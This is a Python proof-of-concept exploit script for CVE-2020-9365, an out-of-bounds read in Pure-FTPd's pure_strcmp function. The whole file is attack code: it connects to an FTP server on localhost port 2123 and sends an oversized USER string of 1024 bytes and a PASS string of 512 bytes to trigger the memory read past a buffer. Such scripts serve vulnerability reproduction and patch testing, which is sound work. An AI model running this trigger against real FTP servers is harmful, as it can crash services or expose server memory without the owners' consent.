#!/usr/bin/env python3
"""
PoC: CVE-2020-9365 - Pure-FTPd pure_strcmp Out-of-Bounds Read
Trigger: Long username causes pure_strcmp to read beyond buffer bounds during authentication
"""

import socket

s = socket.socket()
s.connect(("localhost", 2123))
s.recv(1024)  # banner

# Send very long username - pure_strcmp OOB read triggers when comparing
# passwords where len(s1) > len(s2), causing read past s2 buffer
long_user = b"A" * 1024
s.send(b"USER " + long_user + b"\r\n")
s.recv(1024)

# Send password - this triggers the OOB read in pure_strcmp
s.send(b"PASS " + b"B" * 512 + b"\r\n")
s.recv(1024)
s.close()
